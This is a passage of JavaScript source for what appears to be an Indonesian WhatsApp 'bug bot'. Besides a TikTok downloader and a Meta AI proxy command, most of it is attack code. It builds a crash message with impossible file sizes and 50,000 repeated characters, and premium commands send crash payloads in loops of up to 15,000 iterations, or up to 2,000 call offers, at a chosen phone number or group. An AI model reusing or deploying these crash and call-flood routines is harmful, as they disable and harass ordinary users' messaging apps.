										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰zaxyz🌹",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: babi2
									},
									hasMediaAttachment: true
								},
								body: {
									text: "zaxyz🌹‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"zaxyz🌹" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"zaxyz🌹\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"zaxyz🌹\",\"sections\":[{\"title\":\"zaxyz🌹\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: lol2
				}
			);

			await sock.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.green("GEN1 UI🐉"));
		};
		
		
case 'tiktok': 
      case'tt':{
        if (!qtext) return ReplyRap(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await sock.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await sock.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await sock.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await sock.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await sock.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await sock.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return ReplyRap('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await sock.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break


//END
// CASE SPAM CALL
case 'zaxyzcall': {
if (!q) return ReplyRap("Example Use.\n calloffer 62xx / @tag")
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyRap(`done, mengirim bug lainnya`)
await sleep(10)
for (let i = 0; i < 2000; i++) {
await sendOfferCall(target)
}
}
break

case 'bayy': {
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap("Example Use.\n calloffer 62xx / @tag")
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyRap(`──♢ *LOADING*♢───
─♢ \`2000 CALL\` ♢──
ᴛʜᴇ ᴘʀᴏᴄᴇꜱꜱ ᴏꜰ ꜱᴇɴᴅɪɴɢ, 
ꜱᴏ ᴀꜱ ɴᴏᴛ ᴛᴏ ꜱᴘᴀᴍ ᴡʜɪʟᴇ 
*ᴛʜᴇ ʙᴏᴛ ɪꜱ ꜱᴛɪʟʟ ᴡᴏʀᴋɪɴɢ*
> zaxyz🐉`)
await sleep(1000)
for (let i = 0; i < 2000; i++) {
await sendOfferCall(target)
}
}
break
// VERSION VIDEO

case 'p': case 'woyzaxyz': case 'dimana': case 'kiyomasa': {
    
   if (!PremOnly) return ReplyRap(`Only Prem!`)
    ReplyRap(`Sukses Spam Sender!`)
    {
    for (let i = 0; i < 115; i++) {
}
        }
    let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break
case 'spamcallvid': {
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap("Example Use.\n calloffervideo 62xx / @tag")
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`done, mengirim bug lainnya`)
await sleep(1000)
for (let i = 0; i < 2000; i++) {
await sendOfferVideoCall(target)
await kontol(target)
}
}
break

//CASE BUG
case 'zaxyzlow':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\nzaxyz✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`Success! Bugs sent to ${target}*`)
for (let i = 0; i < 2000; i++) {
await m.reply(`BOKEP MAK LU`)

}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case "group-zaxyz":
case "crash-gb":
case "index-gb":
case "floid-gb":
{
if (!PremOnly) return ReplyRap(" command rejected ");
ReplyRap(" command received ");
if (!q) return ReplyRap(`Example: \n ${prefix + command} https://chat.whatsapp.com/`
);
await sleep(1000);
ReplyRap(`Bot successfully sends a virus message`
);
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
for (let i = 0; i < 100; i++) {
await CrlButton(target);
await CallGc(target);
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'iky':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\n\𝐑zaxyz✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`Success! Bugs sent to ${target}*`)
for (let i = 0; i < 100; i++) {
await SendPairing(target)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "𝐑͢𝐚̃̈𝐩𝐢̶̳̾𝐩𝐩𝐒̶̛𝐚̋˞𝐭̟͟𝐨𝐫̏͟𝐮",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'zax-ui':
case 'c1':
case 'zaxyz-crash':
case 'killed-ui':
case 'zaxyz-elite':
case 'rizkyyoverflow':
case 'rizkyy-overzy':
case 'zaxyz-mainfyz':
case 'xy-bellow':
case 'extreme-combo':
case 'godx-war':
case 'peak-death':
case 'two-force':
case 'instanttrash':
case 'zaxyz-is-here':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : zax 62xx_\nzaxyz✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`
[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${target}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`🍷zaxyz crash 𝗩1 𝗚𝗘𝗡 1👻\`
\`ALLOWNERAUSTIN🐉\`  `)
for (let i = 0; i < 150; i++) {
await protocolbug(target)
await zaxyz(target)
await kontol(target)
await darkflower(target)
await nativemessage(target)
await nativeloc(target)
await darkflower(target)
await nativemessage(target)
await nativeloc(target)
await flowerColors(target)
await flowerColors(target)
await CrlButton(target) 
await Blanking(target)
await CrlButton(target) 
await Blanking(target)
await UiXGhvY(target)
await UiXGhvY(target)
await invc2(target)
await invc2(target)
await FlowX(target)
await darkflower(target)
await nativemessage(target)
await nativeloc(target)
await darkflower(target)
await nativemessage(target)
await nativeloc(target)
await flowerColors(target)
await flowerColors(target)
await CrlButton(target) 
await Blanking(target)
await CrlButton(target) 
await Blanking(target)
await UiXGhvY(target)
await UiXGhvY(target)
await invc2(target)
await invc2(target)
await FlowX(target)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'zaxyz-elite':
case 'fatalaustin':
case 'fatal-ui':
case 'travas-dog': 
case 'trashdex':
case 'freeze':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\n\𝐑zaxyz✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${target}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`🍷zaxyz 𝗩1 𝗚𝗘𝗡 1👻\`
\`ALLOWNERAUTSIN🐉\`  `)
for (let i = 0; i < 150; i++) {
await CrashCalls(target, ptcp = true)
await StravaX(target, ptcp = true)
await ImproveCrash(target, ptcp = true)
await CrashUi(target, ptcp = true)
await AntiSpiral(target, ptcp = true)
await StravaX(target, ptcp = true)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case '94mode':
case 'ikykeche':
case 'black-sadd':
case 'zaxyzsad': 
case 'solos-indero':
case 'boom-dia':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\n\𝐑zaxyź🐉✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${target}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`🍷zaxyz 𝗩1 𝗚𝗘𝗡 1👻\`
\`ALLOWNERAUSTIN🐉\`  `)
for (let i = 0; i < 150; i++) {
await CrashCalls(target, ptcp = true)
await StravaX(target, ptcp = true)
await ImproveCrash(target, ptcp = true)
await CrashUi(target, ptcp = true)
await AntiSpiral(target, ptcp = true)
await StravaX(target, ptcp = true)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "𝐑͢𝐚̃̈𝐩𝐢̶̳̾𝐩𝐩𝐒̶̛𝐚̋˞𝐭̟͟𝐨𝐫̏͟𝐮",
        "sections": [
            {
                "title": "𝑿͢𝑹𝒑𝒊𝒑̶͢͠𝒑𝑴̾𝒐𝒅̈́𝒔̗𝒔🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'zaxyzgamon':
case 'zaxyz-bugx':
case 'zaxyz-opx':
case 'zaxyz-crash':
case 'rizkyy-calls':
case 'rizky-calls':
case 'rizkyy-instant':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\n\𝐑̚͢zaxyź🐉✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`
[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ 𝙏𝙤 :${target}
✾ 𝙏𝙮𝙥𝙚 : *${command}*
 \`🍷zaxyz 𝗩1 𝗚𝗘𝗡 1👻\`
\`ALLOWNERAUSTIN🐉\` `)
for (let i = 0; i < 150; i++) {
await CrashCalls(target, ptcp = true)
await StravaX(target, ptcp = true)
await ImproveCrash(target, ptcp = true)
await CrashUi(target, ptcp = true)
await AntiSpiral(target, ptcp = true)
await StravaX(target, ptcp = true)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'zaxyzflowunlimited':
case 'muscle-ultimate':
case 'ryoiki-tenkai':
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\n\𝐑͢zaxyź🐉✰`)
let target = bijipler + '@s.whatsapp.net'
ReplyRap(`
[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ 𝙏𝙤 :${target}
✾ 𝙏𝙮𝙥𝙚 : *${command}*
 \`🍷zaxyz 𝗩1 𝗚𝗘𝗡 1👻\`
\`AllOwnerAustin🐉\` `)
for (let i = 0; i < 15000; i++) {
await CrashCalls(target, ptcp = true)
await StravaX(target, ptcp = true)
await ImproveCrash(target, ptcp = true)
await CrashUi(target, ptcp = true)
await AntiSpiral(target, ptcp = true)
await StravaX(target, ptcp = true)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://j.top4top.io/p_3352yvr2r0.jpg" },
  footer: "zaxyz🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "zaxyz",
        "sections": [
            {
                "title": "zaxyz🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".zaxyz-elite"
